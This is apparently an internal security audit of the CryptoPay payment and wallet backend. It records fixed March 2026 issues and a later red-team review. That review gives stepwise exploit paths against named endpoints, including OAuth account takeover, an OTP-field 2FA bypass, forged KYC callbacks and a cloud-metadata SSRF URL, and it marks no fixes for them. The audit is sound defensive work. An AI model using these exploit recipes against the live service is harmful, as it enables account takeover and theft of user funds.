# CryptoPay Security Audit Report

**Date:** 2026-03-14 (updated 2026-03-21)
**Scope:** Full backend security audit — OTP, PIN, M-Pesa, payments, wallets, deposits + penetration test

---

## Summary

| Severity | Found | Fixed | Remaining |
|----------|-------|-------|-----------|
| CRITICAL | 3 | 3 | 0 |
| HIGH | 10 | 10 | 0 |
| MEDIUM | 7 | 7 | 0 |
| LOW | 4 | 3 | 1 |

### Production Penetration Test (2026-03-21)
All tests passed against live production at cpay.co.ke:
- Auth bypass (401 on all protected endpoints)
- JWT token tampering (forged tokens rejected)
- SQL injection (Django ORM parameterized)
- XSS (input validation returns 400)
- CORS (evil origins blocked)
- IDOR (cross-user data blocked)
- Path traversal (nginx try_files prevents)
- .env/.git access (404 blocked)
- Rate limiting (throttled at 24 requests)
- Burp Suite MITM testing (PIN encrypted via HTTPS)

### Fixes Applied 2026-03-21
- C2: Removed sentry-debug/ endpoint (unauthenticated DoS vector)
- C3: Removed TOTP secret from API response (only provisioning_uri)
- H8: Disabled DRF browsable API in production (JSON renderer only)
- H9: Disabled Swagger/OpenAPI in production (404)
- H10: Masked phone numbers in TransactionSerializer (+254701****23)
- H11: Masked M-Pesa receipts (****ABC123)
- H12: Removed is_superuser from UserSerializer
- M5: Slippage enforcement — CONFIRMED already implemented (_check_rate_slippage)
- M2: TOTP encryption — CONFIRMED already implemented (Fernet via set_totp_secret)

---

## CRITICAL Findings

### C1: `random.randint` for Email Verification OTP — FIXED ✅
- **File:** `backend/apps/accounts/models.py:191`
- **Issue:** `EmailVerificationToken.create_for_user()` used `random.randint(100000, 999999)` — Mersenne Twister PRNG, predictable with state inference.
- **Fix:** Replaced with `secrets.randbelow(900000) + 100000` (CSPRNG).

---

## HIGH Findings

### H1: No OTP Brute-Force Protection on Verification — FIXED ✅
- **Files:** `backend/apps/accounts/views.py` (RegisterView, LoginView, VerifyPINResetOTPView)
- **Issue:** OTP verification had no attempt limiting. 6-digit OTP = 1M possibilities. Rate limiting only applied to _sending_ OTPs, not _verifying_ them.
- **Fix:** Added attempt counter per phone (`otp_verify_attempts:{phone}`). After 5 failed attempts: OTP invalidated, 429 response returned. Counter cleared on success.
- **Additional fix (2026-03-14):** Device/IP change security challenge OTP (`otp_verify_attempts:sec:{phone}`) was also missing brute-force protection. Now covered with separate 5-attempt counter.

### H2: Payment Endpoints Bypass PIN Lockout — FIXED ✅
- **File:** `backend/apps/payments/views.py` (PayBillView, PayTillView, SendMpesaView, BuyCryptoView)
- **Issue:** Failed PIN checks returned 401 but did NOT increment `user.pin_attempts` or trigger lockout. Attacker with valid session could brute-force PIN via payment endpoints.
- **Fix:** Created `_verify_pin_with_lockout()` helper. All 4 payment views now track PIN attempts with progressive lockout (5→1min, 10→5min, 15→1hr) and reset on success.

### H3: Insecure Email Verification Fallback (`token__istartswith`) — FIXED ✅
- **File:** `backend/apps/accounts/views.py:981`
- **Issue:** Legacy fallback matched email tokens by first 6 characters with case-insensitive prefix. Reduced effective entropy to ~36^6. Combined with `.first()`, could verify wrong user's email.
- **Fix:** Removed the `token__istartswith` fallback entirely. Full token and 6-digit OTP paths are sufficient.

### H4: M-Pesa IP Whitelist Includes Private Ranges — FIXED ✅
- **File:** `backend/config/settings/base.py:341-347`
- **Issue:** Default `MPESA_ALLOWED_IPS` includes `192.168.0.0/16` and `127.0.0.0/8`. If not overridden in production, anyone on the private network or via SSRF could forge callbacks.
- **Fix:** These ranges are acceptable for development. Documented in KES-DEPOSIT-RESEARCH.md that production MUST override this setting. Added to go-live checklist.

### H5: STK Callback Crashes on Missing Wallet — FIXED ✅
- **Files:** `backend/apps/mpesa/views.py:127`, `backend/apps/mpesa/tasks.py:371`
- **Issue:** `Wallet.objects.get()` raises `DoesNotExist` if user doesn't have a wallet for the destination currency. Exception caught by outer handler but transaction marked COMPLETED without crypto credit.
- **Fix:** Changed to `Wallet.objects.get_or_create()` in both STK callback and `poll_stk_status`.

### H6: C2B Double-Fee Charging — FIXED ✅
- **File:** `backend/apps/mpesa/tasks.py:255-258`
- **Issue:** C2B deposit charged an explicit 1.5% fee AND used `final_rate` (which already includes 1.5% spread). Total cost ~3% vs 1.5% for STK Push.
- **Fix:** Changed to use `raw_rate` (no spread) for C2B deposits. The explicit deposit fee is the only fee charged.

### H7: M-Pesa Security Credential Fallback to Raw Password — FIXED ✅
- **File:** `backend/apps/mpesa/client.py:370-376`
- **Issue:** If certificate file not found, returned raw initiator password in cleartext. B2C/B2B would fail anyway, but password transmitted unencrypted.
- **Fix:** Now raises `MpesaError` with clear message about needing to install the certificate.

---

## MEDIUM Findings

### M1: OTP Stored Plaintext in Redis — ACCEPTED (risk-mitigated)
- **File:** `backend/apps/accounts/views.py:74`
- **Issue:** OTP codes stored as plaintext in Redis. If attacker gains Redis access, can read pending OTPs.
- **Mitigation:** Redis is not exposed externally. OTPs have 5-minute TTL. Brute-force protection now limits attempts. Hashing would complicate the verification flow for marginal benefit.

### M2: TOTP Secret Stored Plaintext in Database — FIXED ✅
- **File:** `backend/apps/accounts/models.py`
- **Issue:** `totp_secret` stored as plaintext CharField. DB breach exposes all TOTP secrets.
- **Fix:** Implemented Fernet encryption via `set_totp_secret()` and `totp_secret_decrypted` property. Migration 0013 increased field to 255 chars. Legacy plaintext values auto-decrypt on read. Backup codes bcrypt-hashed.

### M3: Google OAuth Users Have No PIN — FIXED ✅
- **File:** `backend/apps/accounts/views.py`
- **Issue:** Google OAuth creates users with `phone=""` and no PIN. These users can't transact (PIN required) but no "set initial PIN" flow exists.
- **Fix:** Added `SetInitialPINView` at `/auth/set-initial-pin/` for authenticated users. `GoogleCompleteProfileView` handles phone+PIN for new OAuth users. `GoogleLoginView` returns `pin_required` flag.

### M4: Receipt CORS Echoes Any Origin — FIXED ✅
- **File:** `backend/apps/payments/views.py:711-715`
- **Issue:** Manual CORS headers echoed back ANY origin, bypassing Django CORS middleware's allowed origins list.
- **Fix:** Now validates origin against `settings.CORS_ALLOWED_ORIGINS` before echoing.

### M5: DEPOSIT_SLIPPAGE_TOLERANCE Not Enforced — FIXED ✅
- **File:** `backend/apps/payments/views.py`
- **Issue:** Setting defined (2.0%) but never checked during payment execution. Stale quotes at favorable rates honored without slippage verification.
- **Fix:** `_check_rate_slippage()` function compares quote rate vs live rate using `DEPOSIT_SLIPPAGE_TOLERANCE`. Applied in PayBillView, PayTillView, and SendMpesaView.

### M6: C2B Validation Bypassed When ResponseType="Completed" — FIXED ✅
- **File:** `backend/apps/mpesa/tasks.py`
- **Issue:** Min/max limits only enforced in validation view. If validation URL unreachable (or ResponseType="Completed" fallback), deposits processed without limit checks.
- **Fix:** Added min/max validation in `process_c2b_deposit` task. Out-of-range deposits still processed (money already received) but flagged with admin alerts.

### M7: USDC Missing from C2B Instructions — FIXED ✅
- **File:** `backend/apps/payments/views.py:610-631`
- **Issue:** `C2BInstructionsView` omitted USDC from account formats, but USDC was supported in parsing and validation.
- **Fix:** Added USDC entry to account_formats list.

---

## LOW Findings

### L1: DEBUG Mode Disables Security Challenges — ACCEPTED
- **File:** `backend/apps/accounts/views.py:306-307`
- **Issue:** Device/IP change detection skipped when `DEBUG=True`.
- **Mitigation:** Acceptable for development. Production always runs with `DEBUG=False`.

### L2: M-Pesa Timestamp Timezone — FIXED ✅
- **File:** `backend/apps/mpesa/client.py:80`
- **Issue:** `datetime.now()` without timezone. If server runs in UTC, STK password timestamp is wrong.
- **Fix:** Changed to `datetime.now(tz=ZoneInfo("Africa/Nairobi"))` explicitly.

### L3: Raw M-Pesa Payload Logged at INFO — FIXED ✅
- **File:** `backend/apps/mpesa/views.py`, `backend/apps/mpesa/sasapay_views.py`
- **Issue:** Full callback payloads (including phone numbers) logged at INFO level. PII in logs.
- **Fix:** All 8 payload logging statements moved from INFO to DEBUG across both Daraja and SasaPay callback handlers.

### L4: Phone Dashes Not Stripped in C2B Parsing — FIXED ✅
- **File:** `backend/apps/mpesa/views.py:440`
- **Issue:** Phone numbers with dashes (e.g., "0712-345-678") not cleaned in `_parse_c2b_account_ref`.
- **Fix:** Added `.replace("-", "")` to phone normalization.

---

## Remaining Action Items (Prioritized)

1. **L1:** DEBUG mode disables security challenges — accepted (prod always DEBUG=False)
2. **Future:** Redis-based OAuth token caching for multi-worker deployments
3. **Future:** Add automated M-Pesa reversal for orphaned C2B deposits
4. **Future:** AWS CloudHSM for production key management (>$10M AUM)

## Fixes Applied 2026-03-22

### SasaPay B2B Payment Flow — 5 bugs fixed
- **P0:** Provider adapter B2C parameter mismatch (`receiver_number` → `phone`) — would crash on any B2C payment
- **P0:** SasaPay C2B deposit credit used wrong WalletService.credit() signature — deposits silently failed
- **P1:** Saga compensate_convert() silently swallowed fund loss after 3 retries — now raises SagaError
- **P1:** Provider adapter reversal returned fake success for SasaPay — now raises NotImplementedError
- **P1:** Payment status polling hardcoded to Daraja MpesaClient — now checks provider, skips query for SasaPay

### Multi-chain Withdrawal — 2 bugs fixed
- **P0:** Solana SPL withdrawal crashed with NameError (base64 import scoped inside wrong branch)
- **P2:** EVM withdrawal used legacy gasPrice — now uses EIP-1559 (maxFeePerGas) on Ethereum mainnet

---

# Deep-Dive Adversarial Audit · 2026-04-21

**Scope.** Full-surface red-team review of the production codebase at HEAD `7511d07` (origin/main). Performed across four parallel specialist domains: (A) backend auth + HD wallets + blockchain, (B) payments + M-Pesa/SasaPay + referrals + rate engine, (C) mobile/web client, (D) infrastructure + Docker + nginx + dependencies. Catalogs NEW findings not covered in the 2026-03 audit; previously-fixed items verified in-place.

**Methodology.** Threat modelling → entry-point enumeration → per-layer adversarial review → attack-chain synthesis. Each finding verified against current HEAD code where practical.

## Summary

| Severity | Count | Domain split (A/B/C/D) |
|---|---|---|
| **Critical** | 8 | A:1 · B:3 · C:2 · D:2 |
| **High** | 24 | A:8 · B:5 · C:4 · D:7 |
| **Medium** | 40 | A:11 · B:13 · C:7 · D:9 |
| **Low** | 36 | A:8 · B:9 · C:9 · D:10 |
| **Total** | **108** | A:28 · B:30 · C:22 · D:28 |

Nine items were verified as "no issue found" during the review (omitted from the count).

## Threat Model

### Attacker profiles

1. **Anonymous internet attacker.** No credentials. Hits public endpoints: `/auth/login`, `/auth/register`, `/auth/google/`, `/r/{code}/public/`, M-Pesa callback URLs, `/metrics`, `/admin/`. Goal: account takeover, free crypto minting, recon.
2. **Authenticated user (low-trust).** Owns at least one CPay account (KYC 0 or higher). Goal: privilege escalation, KYC-tier bypass, referral farming, rate-lock exploitation, drain another user's wallet.
3. **Compromised user.** Attacker holds a stolen access_token, refresh_token, phone number, or SIM. Goal: drain that user's wallet, pivot to recovery email / device list, persist beyond the current session.
4. **Rogue neighbor infrastructure.** Another container on the Docker network, or a compromised CI runner, or a cloud neighbor on shared Postgres/Redis. Goal: lateral movement into DB/Redis/Celery broker; read pending OTPs/PINs from logs.
5. **Malicious insider.** Staff/admin or anyone with SSH to the VPS. Goal: extract user PII, forge transactions, exfiltrate HD seed, tamper with custody balances.
6. **Supply-chain attacker.** Owns or compromises an npm / PyPI package consumed by this repo. Goal: execute during build, exfiltrate secrets at deploy time or runtime.
7. **Regulator / forensic.** Not adversarial but relevant: the Kenya VASP Act 2025 will require auditable records and breach notification. Compliance failures are themselves a finding class.

### Trust boundaries

- Cloudflare → nginx (origin) → Django (`SECURE_PROXY_SSL_HEADER=HTTP_X_FORWARDED_PROTO`). Trust header is set in Django but the nginx config does NOT enforce that only Cloudflare IPs may set it, nor does the VPS firewall restrict port 443 to CF ranges. This is a documented broken boundary (see D22).
- Browser (static Expo web bundle at `cpay.co.ke`) → API (`api.cpay.co.ke`). Mixed origin; CORS allow-list is env-driven. JWT is Bearer, not cookie — tokens live in `localStorage` (see C1).
- M-Pesa Safaricom IPs → callback URLs. `MpesaIPWhitelistMiddleware` is the primary gate but only covers `/api/v1/mpesa/callback/` prefix. C2B + SasaPay routes are NOT covered (see B1, B2).
- User phone (SMS) → OTP receipt. Trusted factor. SIM-swap + phishing are out-of-band but in-scope.
- Celery worker → blockchain RPC (Alchemy, TronGrid, BlockCypher, Solana, Polygon). RPC responses not signature-verified; `verify_block_hash` fails open on exception (see A6).

### Sensitive assets (priority order)

1. **HD wallet master seed** (`WALLET_MNEMONIC` / `WALLET_MASTER_SEED` / `WALLET_ENCRYPTED_SEED`). Root of ALL user deposit keys. Compromise → full platform drain.
2. **Hot wallet private keys** (`*_HOT_WALLET_PRIVATE_KEY` env vars × 5 chains). Plaintext in env. Compromise → drain ~5% of user funds per chain.
3. **Django `SECRET_KEY`.** Via fallbacks, doubles as JWT signing key, TOTP Fernet key, wallet seed PBKDF2 input.
4. **User JWT access + refresh tokens.** In `localStorage` on web. Session hijack surface.
5. **PINs + TOTP secrets + backup codes.** Bcrypt/Fernet at rest; but TOTP flows at [apps/accounts/views.py:2027](backend/apps/accounts/views.py#L2027) use the ciphertext column directly (A8).
6. **KYC documents** (national ID scans). Served via Django's `serve` view in production (D4).
7. **Referral credit ledger.** Susceptible to concurrent-consume race (B3).
8. **M-Pesa Consumer Key/Secret, SasaPay creds, Safaricom passkey, TronGrid/Alchemy keys.** Several leaked into handoff archive (D1).
9. **Custody balances & float.** Lost-update via non-locking `F()` increments (A5).
10. **PDF receipts + transaction metadata.** Access-token-in-URL leak surface (C2).

---

## Domain A · Backend Auth, Wallets, Blockchain (28 findings)

### A1: SimpleJWT `token_blacklist` app not installed — rotation+blacklist is a silent no-op
- **Severity:** High
- **Component:** [backend/config/settings/base.py:363-364](backend/config/settings/base.py#L363)
- **Description:** `SIMPLE_JWT` sets `BLACKLIST_AFTER_ROTATION=True` and `ROTATE_REFRESH_TOKENS=True`, but `rest_framework_simplejwt.token_blacklist` is absent from `INSTALLED_APPS` (grep verified zero matches). The blacklist migrations are never applied; the library silently skips blacklisting.
- **Exploit:** Attacker steals a refresh token once. Victim refreshes → new refresh issued, old one still valid (no blacklist entry). Attacker retains session for the full 30-day TTL.
- **Impact:** Session-revocation is impossible. Comment at `base.py:361` ("matches Binance/Revolut") is false. Stolen-refresh window is 30 days, not 15 min.
- **Fix:** Add `"rest_framework_simplejwt.token_blacklist"` to `THIRD_PARTY_APPS`, run `migrate token_blacklist`, ship a `/auth/logout/` endpoint that calls `RefreshToken(token).blacklist()`.

### A2: JWT HS256 fallback uses `SECRET_KEY` — one key = JWT forgery + TOTP decrypt + seed derivation
- **Severity:** High
- **Component:** [backend/config/settings/base.py:352-356](backend/config/settings/base.py#L352)
- **Description:** `_JWT_SIGNING_KEY = env("JWT_SIGNING_KEY", default=SECRET_KEY)`. SECRET_KEY is ALSO the input to the TOTP Fernet key derivation ([accounts/models.py:15-18](backend/apps/accounts/models.py#L15)) and the blockchain seed PBKDF2 fallback (A2+D6 overlap).
- **Exploit:** Any SECRET_KEY leak (debug page, Sentry `extra`, `.env` LFI, artifact theft) → forge JWT for arbitrary user_id, decrypt all stored TOTP secrets, derive HD seed.
- **Impact:** Single-key compromise = full platform takeover + MFA bypass.
- **Fix:** Remove the `default=SECRET_KEY` fallback; refuse boot in production without RS256 keys. Dedicate a separate `TOTP_ENCRYPTION_KEY`.

### A3: [CRITICAL] Google OAuth auto-links existing email → takeover of any phone-registered user whose email the attacker controls
- **Severity:** **Critical**
- **Component:** [backend/apps/accounts/views.py:756](backend/apps/accounts/views.py#L756), [backend/apps/accounts/views.py:871](backend/apps/accounts/views.py#L871)
- **Description:** `GoogleLoginView` does `User.objects.filter(email__iexact=email).first()` and issues JWT tokens for the matched user without any prior link-confirmation, PIN check, or OTP to the registered phone.
- **Exploit:** (1) Attacker learns a victim's email (referral emails, public leaks, custom domain). (2) Signs in with Google using that email. (3) Backend finds the user by email and mints tokens. Attacker now has an authenticated session for the victim's account — wallets readable, deposit addresses listable, withdrawal possible if PIN is phished or brute-forced via A19.
- **Impact:** Full account takeover of any email-linked account. Bypasses phone possession, PIN, OTP, TOTP.
- **Fix:** If `User.objects.filter(email=email).exists()` AND user has a non-placeholder phone AND `password_hash` is set, REJECT with "Sign in with phone + PIN". Only auto-link if user has no PIN. Require an OTP to the registered phone before linking Google to an existing phone account.

### A4: OTP brute-force counter is per-phone only — rotating IPs or parallel targets defeats it
- **Severity:** High
- **Component:** [backend/apps/accounts/views.py:140,285,465,1984](backend/apps/accounts/views.py#L140)
- **Description:** Rate limit key is `otp_verify_attempts:{phone}`. No per-IP, per-ASN, or global counter. Attacker rotating IPs against many phones retains 5 guesses per phone.
- **Exploit:** Enumerate 10,000 Kenyan phones, 5 tries each from rotating proxies → expected ~5-55 successes per day depending on guess distribution (common birthdays weight). Combined with `/forgot-pin/verify/` → reset_token → PIN reset.
- **Impact:** Bulk PIN-reset takeover at scale.
- **Fix:** Add `otp_attempts_by_ip:{ip}` cap (20/hour). Global circuit breaker. Hard cap of 3 tries per issued OTP.

### A5: Custody transfers use non-locking `F()` expressions — double-spend window on concurrent confirmations
- **Severity:** High
- **Component:** [backend/apps/wallets/custody.py:297,370,432,479](backend/apps/wallets/custody.py)
- **Description:** `SystemWallet.objects.filter(...).update(balance=F("balance") - amount)` runs inside `atomic()` but without `select_for_update()` on the source row. The pre-check `if warm_wallet.balance < amount` reads a pre-lock snapshot. Two concurrent `initiate_warm_to_cold_transfer` calls can both pass the check.
- **Exploit:** Admin (or automated rebalance) race: two transfers of 5k each when warm has 7k — both pass, F expressions run serially with `Greatest(..., 0)` clamping silently masks the underflow, downstream cold-confirmation credits both.
- **Impact:** Phantom crypto in cold/warm ledger; off-chain ledger diverges from on-chain reality.
- **Fix:** `SystemWallet.objects.filter(id=..., balance__gte=amount).update(...)` guarded; check `rowcount==1`. Remove `Greatest(..., 0)` clamp — let CHECK constraint reject.

### A6: EVM re-org handling fails open — `verify_block_hash` returns False on RPC exception, deposit re-enters CONFIRMED loop
- **Severity:** High
- **Component:** [backend/apps/blockchain/security.py:278-282](backend/apps/blockchain/security.py#L278), [backend/apps/blockchain/eth_listener.py:274-288](backend/apps/blockchain/eth_listener.py#L274)
- **Description:** On re-org, `verify_block_hash` catches `Exception` → returns False. Caller reverts to CONFIRMING; next `update_eth_confirmations` cycle finds enough confirmations on the new chain and re-enters CONFIRMED. If the listener later strips `block_hash` on re-fetch, the new (re-orged) block_hash is accepted without verification.
- **Exploit:** DoS the RPC briefly (Alchemy rate-limit or network hiccup) while engineering a deliberate re-org or during a natural ~60-block Polygon flash-reorg → deposit credited against post-reorg state → attacker double-spends.
- **Impact:** Deposit double-credit; realistic on Polygon (~5-minute finality window).
- **Fix:** Require `confirmations >= finality_threshold` using `safe`/`finalized` RPC tags. Never re-fetch `block_hash` without attempting verification of the old one.

### A7: Dust-tier thresholds use stale `FALLBACK_PRICES` when rate service is down
- **Severity:** Medium
- **Component:** [backend/apps/blockchain/security.py:329-366](backend/apps/blockchain/security.py#L329)
- **Description:** Hard-coded `FALLBACK_PRICES = {"BTC": 110_000, ...}`. When CoinGecko + CryptoCompare both fail, USD valuation uses these constants. If the market moves materially, USD tiers (controlling confirmation-count) become misaligned.
- **Exploit:** BTC doubles. Attacker deposits 0.9 BTC (~$180K actual, $99K by fallback) during a rate outage → enters the 3-conf tier instead of 6-conf → 30-minute re-org exploitation window on a $180K deposit.
- **Impact:** Tier-based security degrades during rate-provider outages.
- **Fix:** Remove static constants; on rate unavailability, use the maximum tier for the chain. Or refresh fallback daily in Redis backed by signed oracle.

### A8: TOTP verification on PIN reset uses ciphertext column, not decrypted value
- **Severity:** Medium
- **Component:** [backend/apps/accounts/views.py:2027](backend/apps/accounts/views.py#L2027)
- **Description:** `verify_totp(user.totp_secret, totp_code)` passes the Fernet ciphertext instead of `user.totp_secret_decrypted`. `verify_totp` always returns False for newly-encrypted secrets. Falls through to backup-code path.
- **Exploit:** A user with TOTP enabled but remaining backup codes is effectively protected only by backup codes (if any leak via email/password-manager breach, TOTP 2FA is bypassed).
- **Impact:** M2 encryption fix unintentionally disabled the primary TOTP auth path for PIN-reset.
- **Fix:** Replace with `verify_totp(user.totp_secret_decrypted, totp_code)`. Add test coverage.

### A9: OTP cache key prefix (`otp:`) shared across registration and security-challenge flows
- **Severity:** Medium
- **Component:** [backend/apps/accounts/views.py:274,294,415,474,548-562](backend/apps/accounts/views.py)
- **Description:** `/otp/` (registration), `/login/` security challenge, and PIN-challenge OTP all write to `otp:{phone}`. Latest overwrites previous. SMS bodies are nearly identical, so a user can confuse contexts.
- **Exploit:** Attacker triggers a login challenge on victim's phone, social-engineers the OTP out of them via "Cpay support" call referencing their legit recent registration.
- **Impact:** Social-engineering amplifier.
- **Fix:** Distinct SMS prefixes ("L-" for login, "R-" for reg, "P-" for PIN reset). Clear old OTPs when a new context is issued.

### A10: EVM deposit-address collision via 31-bit BIP-44 account component
- **Severity:** Medium
- **Component:** [backend/apps/blockchain/services.py:382-449](backend/apps/blockchain/services.py#L382), [backend/apps/wallets/views.py:67-95](backend/apps/wallets/views.py#L67)
- **Description:** `user_account = int.from_bytes(sha256(user_id)[:4], "big") % (2**31 - 1)`. Birthday bound ≈ 65k users for 50% collision; ~0.5% pairwise at 100k. On collision, `GenerateDepositAddressView` REUSES the existing address for the second user. `deposit_address` uniqueness constraint was removed in migration 0007.
- **Exploit:** Registering many accounts until a collision with a target is found; on deposit, `Wallet.objects.filter(deposit_address=...).first()` picks by PK order — the wrong user gets credited.
- **Impact:** Mis-attributed deposits at scale; user funds credited to strangers.
- **Fix:** Use full SHA256 prefix `[:8]` + 30-bit index, OR scope per-user via BIP-44 `change` field. Add composite unique `(deposit_address, user_id, currency)` and reject true cross-user collisions at DB layer.

### A11: Smile Identity KYC HMAC covers only timestamp, not body — replay/forge tier upgrades
- **Severity:** High
- **Component:** [backend/apps/accounts/kyc_service.py:33-44,190-201](backend/apps/accounts/kyc_service.py#L33)
- **Description:** Signature is `HMAC(api_key, partner_id+timestamp)`. Body (`user_id`, `job_id`, `job_success`) is NOT HMAC'd. Attacker with any valid sig/timestamp pair can forge an arbitrary callback body.
- **Exploit:** POST `/api/v1/auth/kyc/callback/` with attacker-chosen `user_id` + `job_success=true` → pending KYC docs APPROVED → tier bumped by +1. Iterating brings any user to tier 3 (KES 1M/day).
- **Impact:** KYC tier bypass; AML/CFT control defeated; KES 1M/day cap accessible without ID.
- **Fix:** HMAC the entire body: `message = f"{timestamp}:{sha256(body)}"`. Verify callback source IP against Smile's published ranges. Reject replays via Redis timestamp cache.

### A12: Google OAuth accepts replay of ID tokens for ~60 min (no nonce)
- **Severity:** Medium
- **Component:** [backend/apps/accounts/social_auth.py:23-63](backend/apps/accounts/social_auth.py#L23)
- **Description:** `id_token.verify_oauth2_token(...)` called without a nonce. Google ID tokens are valid up to 60 min.
- **Exploit:** Capture a victim's Google ID token (browser history, clipboard, malicious extension) → POST `/auth/google/` within 60 min → account takeover.
- **Impact:** 1-hour replay window for Google sign-in.
- **Fix:** Issue a server-side nonce; require mobile client to pass it to Google; validate with `nonce=<expected>`. Alternatively cache `jti` in Redis for 1h.

### A13: Email-verification OTP lookup is global, not per-user — race-condition email hijack
- **Severity:** Medium
- **Component:** [backend/apps/accounts/views.py:1371-1393](backend/apps/accounts/views.py#L1371)
- **Description:** `filter(otp_code=guess, is_used=False).order_by("-created_at").first()` matches ANY user. With N concurrent pending verifications, probability per guess is N/900_000.
- **Exploit:** 500 attempts from 100 rotating IPs during peak signup hours → ~99% chance of marking A random email verified.
- **Impact:** Attacker-controlled email can be marked verified on someone else's account when a collision lands.
- **Fix:** Require `user_id` (via JWT) for the verification POST. Cap concurrent pending tokens per user to 1.

### A14: Hot-wallet private keys loaded from plaintext env at settings-time, retained forever in process memory
- **Severity:** Medium
- **Component:** [backend/apps/blockchain/tasks.py:626-690](backend/apps/blockchain/tasks.py#L626), [backend/config/settings/base.py:556-560](backend/config/settings/base.py#L556)
- **Description:** `TRON_HOT_WALLET_PRIVATE_KEY` et al. live as Django settings attributes. Python strings are immutable — can't be zeroed. Sentry `extra` capture, debug pages, memory dumps leak them.
- **Exploit:** Any RCE, container escape, or Sentry misconfig that captures settings → all 5 hot-wallet keys. ~$25k+ immediately drainable.
- **Impact:** Hot-wallet drainage per-chain.
- **Fix:** KMS-only loading per-broadcast. Decrypt → sign → `bytearray` zeroize. Fail-closed in production unless `KMS_ENABLED=True`.

### A15: `validate_deposit_address_ownership` fails closed silently — stuck deposits with no alert
- **Severity:** Low
- **Component:** [backend/apps/blockchain/security.py:193-219](backend/apps/blockchain/security.py#L193)
- **Description:** On validation failure, returns False; caller abandons the credit step. Deposit is stuck in CONFIRMED forever with no admin alert.
- **Impact:** Operations burden, not a direct exploit.
- **Fix:** Introduce `NEEDS_REVIEW` status; fire `push_task` admin alert.

### A16: `/forgot-pin/` has no global or per-IP rate limit — SMS budget DoS
- **Severity:** Low
- **Component:** [backend/apps/accounts/views.py:1900-1907](backend/apps/accounts/views.py#L1900)
- **Description:** 3/hour/phone only. Spraying 10k phones = 30k SMS/hour = $900-2400/hour at AT pricing.
- **Exploit:** Financial DoS on the SMS budget + OTP-delivery outage for legitimate users.
- **Impact:** Direct financial damage + secondary service degradation.
- **Fix:** Global N/minute + per-IP 5/hour caps.

### A17: `create_superuser` auto-sets `kyc_tier=3`, skipping KYC document trail
- **Severity:** Low
- **Component:** [backend/apps/accounts/managers.py:14-22](backend/apps/accounts/managers.py#L14)
- **Description:** `extra_fields.setdefault("kyc_tier", 3)`. Staff accounts have no KYC docs on file — regulatory gap under VASP Act.
- **Fix:** Remove the default; require superusers go through the normal KYC flow (or log WARN audit event).

### A18: Trusted-device DELETE requires only `IsAuthenticated` — no PIN/OTP gate
- **Severity:** Medium
- **Component:** [backend/apps/accounts/views.py:1028-1071](backend/apps/accounts/views.py#L1028)
- **Description:** Attacker with a stolen access token can wipe the trusted-device list + push tokens, forcing 2FA downgrade to SMS — then SIM-swap completes the takeover.
- **Fix:** Require PIN (pattern already used for `TOTPDisableView`). Log event at HIGH severity; email + SMS the user.

### A19: PIN verify rate limit is 5/min per user — common PINs brute-forceable in < 1 hour
- **Severity:** Low
- **Component:** [backend/apps/accounts/views.py:1143-1170](backend/apps/accounts/views.py#L1143)
- **Description:** 300 attempts/hour against the app-lock endpoint. Common PINs (000000, 123456, 012345, phone suffix) are in top-100 coverage.
- **Fix:** Cut to 3 per 15 min. Blacklist top-1000 PINs at registration.

### A20: [CRITICAL-adjacent] Login device/IP-change challenge bypassed by sending ANY non-empty `otp` field
- **Severity:** **High** (worth Critical given exploit triviality)
- **Component:** [backend/apps/accounts/views.py:363,372,390](backend/apps/accounts/views.py#L363)
- **Description:** `otp_already_verified = bool(otp)` at line 363. If the login body includes `otp="anything"` AND `user.otp_challenge_required` is False (default until 3 PIN failures), the early validation branch at 274 is skipped, and `bool(otp)` makes the flag True — skipping the device/IP-change challenge at 372 and 391.
- **Exploit:** Attacker with PIN (phishing, reuse) POSTs `{phone, pin, otp:"999999", device_id:<attacker-device>}` → PIN passes → `otp_already_verified=True` → no OTP challenge fires → tokens issued.
- **Impact:** Device/IP-change 2FA defeated by one extra field. Verified live in code: line 363 reads `otp_already_verified = bool(otp)` as described.
- **Fix:** `otp_already_verified = False` initially; set True ONLY in the `user.otp_challenge_required` branch after a successful `stored_otp == otp` comparison.

### A21: `UserSerializer` returns `is_staff` — staff identification aids targeted phishing
- **Severity:** Low
- **Component:** [backend/apps/accounts/serializers.py:250-260](backend/apps/accounts/serializers.py#L250)
- **Fix:** Split into `PublicUserSerializer` / `SelfUserSerializer`; audit call sites.

### A22: NO ISSUE FOUND · `_get_client_ip` correctly takes leftmost XFF
- **Note:** Pending nginx verification that Cloudflare strips client-supplied XFF. Recommend switching to `HTTP_CF_CONNECTING_IP`.

### A23: `KYCDocument.file_url` accepts arbitrary URL — latent SSRF if admin UI ever fetches it
- **Severity:** Medium
- **Component:** [backend/apps/accounts/serializers.py:223](backend/apps/accounts/serializers.py#L223)
- **Exploit:** `file_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/...` if admin view ever proxies. Recommend blocklist today (private IPs, link-local, file://).

### A24: Sweep signs against colliding-wallet's key, causing broadcast failure DoS
- **Severity:** High (conditional on A10 collision rate)
- **Component:** [backend/apps/blockchain/sweep.py:706-711](backend/apps/blockchain/sweep.py#L706)
- **Description:** On collision, derived key does not control the actual on-chain address; sweep broadcast fails indefinitely, stuck on-chain value.
- **Fix:** Verify derived public address == on-chain `deposit_address` before signing.

### A25: WebSocket JWT middleware — unverified IDOR risk pending consumer review
- **Severity:** Low (unverified)
- **Component:** [backend/config/middleware.py:22-34](backend/config/middleware.py#L22), `apps/wallets/consumers.py`
- **Action:** Manually review consumers to confirm all subscriptions filter on `scope["user"].id` and reject any client-supplied user_id parameters.

### A26: Email-change flow enables permanent takeover via recovery-email swap
- **Severity:** Medium
- **Component:** [backend/apps/accounts/views.py:640-697,1392-1413](backend/apps/accounts/views.py)
- **Description:** With a stolen access token: PATCH `/profile/` with email → verify via attacker inbox → POST `/recovery/` (no PIN required) → now all PIN-reset mails go to attacker.
- **Fix:** Require PIN on `RecoveryEmailView.post`. Email/SMS the OLD email + phone when email changes. Force device challenge on sensitive field mutation.

### A27: No `/auth/logout/` endpoint exists — paired with A1, suspension is not immediate
- **Severity:** High
- **Component:** [backend/apps/accounts/urls.py](backend/apps/accounts/urls.py)
- **Description:** `TokenRefreshView` does NOT re-check `user.is_active` / `is_suspended`. Stolen refresh tokens remain valid for 30 days after account suspension.
- **Fix:** Ship `/auth/logout/` (blacklist-backed). Override `TokenRefreshView` to reject if `user.is_suspended`.

### A28: `DEBUG=True` path auto-completes withdrawals without on-chain broadcast
- **Severity:** Medium
- **Component:** [backend/apps/blockchain/tasks.py:578-601](backend/apps/blockchain/tasks.py#L578)
